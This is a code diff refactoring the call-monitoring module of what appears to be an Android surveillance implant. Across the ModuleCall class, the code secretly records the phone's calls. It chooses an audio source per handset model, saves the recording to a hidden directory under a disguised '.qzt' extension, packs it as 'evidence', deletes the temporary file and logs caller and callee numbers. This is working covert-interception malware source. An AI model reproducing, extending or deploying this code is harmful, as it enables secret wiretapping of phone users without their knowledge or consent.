@@ -109,74 +109,93 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (call.isOngoing()) {
 			// save date and number
 			from = new DateTime(call.getTimestamp());
-			number = call.getNumber();
+			number = call.getNumber();		
+		}
+		
+		if(number==null){
+			number="";
 		}
 
 		final DateTime to = new DateTime(call.getTimestamp());
+		int ret = 0;
+		try {
+			// Let's start with call recording
+			if (record && isSupported()) {
+				ret = recordCall(call, incoming, to);
 
-		// Let's start with call recording
-		if (record && isSupported()) {
-			if (!call.isOngoing()) {
-				if (stopRecord()) {
-					Object future = Status.self().getStpe().schedule(new Runnable() {
-						public void run() {
-							saveCallEvidence(number, incoming, from, to, currentRecordFile);
-						}
-					}, 100, TimeUnit.MILLISECONDS);
-					
-					// Se un giorno la conf non dovesse includere gia' tutti i moduli,
-					// self() tornerebbe NULL in quanto non instanziato.
-					ModuleMic mic = ModuleMic.self();
-					
-					if (mic != null) {
-						mic.resume();
+			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " ERROR (notification), " + ex);
+			}
+		}
+
+		if (!call.isOngoing()) {
+			saveCalllistEvidence(number, incoming, from, to);
+		}
+
+		return ret;
+	}
+
+	private int recordCall(Call call, final boolean incoming, final DateTime to) {
+		if (!call.isOngoing()) {
+			if (stopRecord()) {
+				Object future = Status.self().getStpe().schedule(new Runnable() {
+					public void run() {
+						saveCallEvidence(number, incoming, from, to, currentRecordFile);
 					}
-				}
+				}, 100, TimeUnit.MILLISECONDS);
 
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
+				// Se un giorno la conf non dovesse includere gia' tutti
+				// i moduli,
+				// self() tornerebbe NULL in quanto non instanziato.
+				ModuleMic mic = ModuleMic.self();
+
+				if (mic != null) {
+					mic.resume();
 				}
-				
-				return 0;
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
+				Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
 			}
 
-			int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
-			int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
-
-			Long ts = new Long(System.currentTimeMillis());
-			String tmp = ts.toString();
-			
-			// Logfile .3gpp in chiaro, temporaneo
-			String path = Path.hidden() + "/" + tmp + ".qzt";
-
-			ModuleMic mic = ModuleMic.self();
-			
-			if (mic != null) {
-				mic.suspend();
-			}
-			
-			if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
-				}
-
-				return 1;
-			}
-			
-			mic = ModuleMic.self();
-			
-			if (mic != null) {
-				mic.resume();
-			}
-			
+			return 0;
 		}
 
-		saveCalllistEvidence(number, incoming, from, to);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
+		}
 
+		int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
+		int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
+
+		Long ts = new Long(System.currentTimeMillis());
+		String tmp = ts.toString();
+
+		// Logfile .3gpp in chiaro, temporaneo
+		String path = Path.hidden() + "/" + tmp + ".qzt";
+
+		ModuleMic mic = ModuleMic.self();
+
+		if (mic != null) {
+			mic.suspend();
+		}
+
+		if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
+			}
+
+			return 1;
+		}
+
+		mic = ModuleMic.self();
+
+		if (mic != null) {
+			mic.resume();
+		}
+		
 		return 0;
 	}
 
@@ -202,10 +221,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 				offset = AMR_HEADER.length;
 			}
-			
+
 			byte[] data = file.read(offset);
 			int pos = checkIntegrity(data);
-			
+
 			if (pos != data.length) {
 				data = ByteArray.copy(data, 0, pos);
 			}
@@ -214,14 +233,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
 				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
 			}
-			
+
 			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
 			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveCallEvidence): not deleting file: " + file);
 			}
-			
+
 			file.delete();
 		}
 	}
@@ -229,23 +248,23 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private int checkIntegrity(byte[] data) {
 		int pos = 0;
 		int chunklen = 0;
-		
-		while (pos < data.length) {			
+
+		while (pos < data.length) {
 			chunklen = amr_sizes[(data[pos] >> 3) & 0x0f];
-			
+
 			if (chunklen == 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (saveRecorderEvidence) Error: zero len amr chunk, pos: " + pos);
 				}
 			}
-			
+
 			pos += chunklen + 1;
-		} 
+		}
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkIntegrity): end");
 		}
-		
+
 		return pos;
 	}
 
@@ -253,6 +272,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getCallAdditionalData): " + number);
 		}
+		
+		if (Cfg.DEBUG) { Check.asserts(number !=null, " (getCallAdditionalData) Assert failed, null number"); }
 
 		byte[] caller;
 		byte[] callee;
@@ -289,6 +310,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCalllistEvidence): " + number);
 		}
+		if (Cfg.DEBUG) { Check.asserts(number!=null, " (saveCalllistEvidence) Assert failed"); }
 		final boolean outgoing = !incoming;
 		// final int duration = call.getDuration(call);
 
@@ -337,34 +359,34 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (model.contains("i9100")) { // Samsung Galaxy S2
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
 			}
-		} else if (model.contains("galaxy nexus")){ // Samsung Galaxy Nexus
+		} else if (model.contains("galaxy nexus")) { // Samsung Galaxy Nexus
 			supported = true;
 			strategy = MediaRecorder.AudioSource.DEFAULT;
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
 			}
-		}  else if (model.contains("gt-i9300")){ // Galaxy S3
+		} else if (model.contains("gt-i9300")) { // Galaxy S3
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
 			}
-		}  else if (model.contains("xt910")){ // Motorola xt-910
+		} else if (model.contains("xt910")) { // Motorola xt-910
 			supported = false;
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
 			}
-		}  else if (model.contains("gt-p1000")){ // Samsung Galaxy Tab 7''
+		} else if (model.contains("gt-p1000")) { // Samsung Galaxy Tab 7''
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-			
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Samsung Galaxy Tab 7'',  supported"); //$NON-NLS-1$
 			}
@@ -391,8 +413,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		recorder.setAudioSource(audioSource);
 		recorder.setOutputFormat(outputFormat);
 		// REMOVE
-		//recorder.setAudioChannels(1);
-		
+		// recorder.setAudioChannels(1);
+
 		recorder.setAudioEncoder(audioEncoder);
 		recorder.setOutputFile(path);
 
@@ -425,7 +447,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		recorder = null;
 		return true;
 	}
-
 
 	private int getStrategyNotYetWorking() {
 		Markup markupCallStrategy = new Markup(this);
